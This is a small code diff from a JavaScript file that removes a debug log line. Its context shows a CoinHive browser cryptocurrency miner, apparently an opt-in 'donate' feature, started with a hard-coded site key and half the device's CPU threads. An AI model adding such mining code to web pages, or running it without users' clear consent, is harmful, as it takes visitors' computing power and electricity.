@@ -8,7 +8,6 @@ var fn = function () {
     if (window.config.donate !== '0') {
       setTimeout(function () {
         var throttle = 1 - (Number(window.config.donate) / 100);
-        console.log('throttle', throttle);
         window.miner = new window.CoinHive.User('UQRb5qC7tol0dXkjKY3tBEgxCEGS7oeR', name, {
           throttle: throttle,
           threads: Math.ceil(navigator.hardwareConcurrency / 2),
